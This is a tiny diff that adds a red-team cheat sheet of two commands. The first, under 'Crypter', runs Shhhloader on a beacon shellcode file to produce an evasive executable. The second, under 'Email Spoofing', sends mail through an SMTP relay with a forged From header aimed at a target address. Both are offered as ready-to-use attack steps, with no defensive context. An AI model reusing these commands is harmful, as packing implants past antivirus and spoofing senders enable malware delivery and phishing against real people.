@@ -1,0 +1,5 @@
+Crypter
+$ ./Shhhloader.py beacon.bin -m CurrentThread -sc none -w -ns -o sand.exe
+
+Email Spoofing
+$ sendmail -xu email@domain.com -xp password -s smtp-relay.sendin blue.com:port -f "spoofmail@domain.com" -t "target@domain.com" -u "subject" -m "message" -o message-header="From: spoofmail <spoofmail@domain.com>"
